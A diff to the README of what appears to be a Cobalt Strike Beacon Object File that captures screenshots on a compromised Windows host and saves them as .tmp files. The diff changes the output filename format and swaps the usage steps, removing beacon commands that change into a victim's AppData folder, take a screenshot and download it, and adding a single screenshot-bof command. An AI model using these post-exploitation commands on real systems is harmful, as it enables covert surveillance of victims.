@@ -8,18 +8,12 @@ TBH I haven't tested this too much just seemed like a cool idea
 ## Notes
 
 - Export screenshots to **%TEMP%** or the **current working directory** as `.tmp` files
-- Output format: `<width>oo<height>.tmp`
+- Output format: `time_<width>oo<height>.tmp`
 - Reconstruct `.tmp` files into PNG format locally
 - Libraries Used - MSVCRT, D3D9
 
 ### BOF Execution
-
-Ensure you are in the directory you would like the screenshot exported as. 
-```
-beacon> cd C:\Users\Victim\AppData\
-beacon> screenshot-dx
-beacon> download <filename>
-```
+```beacon> screenshot-bof```
 
 ### Example
 
